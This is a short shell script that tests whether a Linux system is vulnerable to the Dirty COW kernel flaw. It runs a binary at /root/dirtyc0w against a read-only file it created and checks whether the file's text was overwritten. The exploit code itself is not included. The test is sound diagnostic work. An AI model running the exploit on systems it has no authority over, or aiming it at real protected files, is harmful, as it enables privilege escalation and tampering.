#!/bin/sh
set -e

#run the test script
echo "You are SAFE!          " > foo
chmod 404 foo
/root/dirtyc0w foo "You are VULNERABLE!!!" &
sleep 2
cat foo
